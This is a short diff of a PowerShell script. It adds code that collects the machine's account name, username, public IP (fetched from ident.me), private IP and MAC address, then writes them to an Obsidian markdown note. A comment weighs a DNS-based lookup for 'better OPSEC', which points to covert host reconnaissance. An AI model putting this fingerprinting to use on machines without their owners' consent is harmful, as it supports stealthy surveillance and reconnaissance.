@@ -9,8 +9,15 @@ $account = $env:userprofile.Split('\')[2]
 $username = $env:username
 $markdown = "$account.md"
 
-# Functions
 
+# network values
+# possible replacement for using curl.exe (better OPSEC)
+# $public = Resolve-DnsName -Server ns1.google.com -Type TXT -Name o-o.myaddr.l.google.com | Select-Object -ExpandProperty 'Strings'
+$public = curl.exe https://ident.me
+$private = (get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}).ipaddress[0]
+$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
+
+# Functions
 # Send content to Obsidian
 function Send-ToObsidian {
     param (
